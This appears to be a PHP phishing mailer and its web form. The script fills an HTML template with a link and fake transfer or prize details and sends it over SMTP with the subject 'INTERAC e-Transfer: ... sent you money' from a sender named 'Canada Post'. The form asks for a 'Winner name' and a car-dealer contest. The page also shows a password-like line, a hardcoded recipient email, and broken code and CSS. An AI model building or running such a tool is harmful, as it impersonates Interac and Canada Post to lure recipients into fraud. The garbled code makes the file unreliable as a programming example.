<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require ("PHPMailer/src/PHPMailer.php");
require ("PHPMailer/src/SMTP.php");
require ("PHPMailer/src/Exception.php");

$template = file_get_contents('transfer1.html');
$message = str_replace('{{expiredate}}', $_POST['expiredate'], $template);
$message = str_replace('{{username}}', $_POST['username'], $template);
$message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
$message = str_replace('{{bank}}', $_POST['bank'], $message);
$message = str_replace('{{amount}}', $_POST['amount'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message);
$message = str_replace('{{expiredate}}', $_POST['expiredate'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{photo_link}}', $_POST['photo_link'], $message);
$message = str_replace('{{sender_name}}', $_POST['sender_name'], $message);
$message = str_replace('{{receiver_name}}', $_POST['receiver_name'], $message);
$message = str_replace('{{receiver_email}}', $_POST['receiver_email'], $message);


$mail = new PHPMailer(); 
$mail->IsSMTP(); 
$mail->SMTPSecure = 'tsl';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port']; 
$mail->Body = $message; // use $message instead of $template
$mail->SMTPAuth = true; 
$mail->Username = $_POST['username']; 
$mail->Password = $_POST['password']; 
$mail->SetFrom('<smtp@email.com>', $_POST['sender_name']); 
$mail->AddAddress($_POST['receiver_email']); 
$mail->Subject = 'INTERAC e-Transfer: '.$_POST['sender_name'].' sent you money.';
$mail->IsHTML(true); 
$mail->CharSet="utf-8";

if(!$mail->Send()) {  
    echo "Mailer Error: " . $mail->ErrorInfo;
} 

?>

<html><head><script src="chrome-extension://ajdpfmkffanmkhejnopjppegokpogffp/assets/prompt.js"></script></head><body>Mailer Error: You must provide at least one recipient email address.
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Canadian Flail</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
<style>
    /* CSS design optimized for iPhones */
    body {
        font-family: Arial, sans-serif;
        font-size: 16px;
        color: #0C9r50;
        background-color: #0CAFd0;
    }
    #container {
        width: 70%;
        max-width: 600px;
        margin: 0 auto;
        background-color black;
        padding: 20px;
        border-radius: 5px;
    }
    input[type="text"], textarea {
        width: 70%;
        padding: 12px;
        border: 4px solid #1n1n1n;
        border-radius: 4px;
        box-sizing: border-box;
        margin-top: 6px;
        margin-bottom: 16px;
        resize: ;
    }
    input[type="submit"] {
        background-color: #4CAF50;
        color: white;
            padding: 1% 30%;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .error {
            color: #ff0000;
        }
    </style>



<h1 style="text-align: center;">DODGE-POST-MAIL</h1>

<form action="https://client.exclusive4wheels.com/home"><button type="submit" value="DODGE">r54tty54yt</button></form><br>CANADA MARKETING DATA BASE PASS 123456<br>
<form action="submit1.php" method="POST" enctype="multipart/form-data">

	
<fieldset>
<center>
<input type="text" id="search" name="link" required="" placeholder="INPUT LINK DO NOT PUT / AT END"><input type="text" name="receiver_name" placeholder="Winner name"><br> 
<input type="text" id="search" name="receiver_email" value="swiftrynx@gmail.com">

<input type="text" name="sender_name" value="Canada Post">

<input type="text" name="expiredate" placeholder="DODGE DEALER SHIP CONTEST" required=""><br>
<center><input type="submit" value="Submit"><br></center><input type="hidden" name="amount" step="0.01" placeholder="NULL"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>

    




    


  
    
  
  
    
    
  


<input type="text" name="port" value="<smtp-port>" required="">
<input type="text" name="username" value="<smtp@email.com>" required="">
<br><br><br><br><br><br><br><br><input type="password" name="password" value="<smtp-password>" required="">
<input type="text" name="host" value="<smtp-url>" required=""></center></fieldset></form></body></html>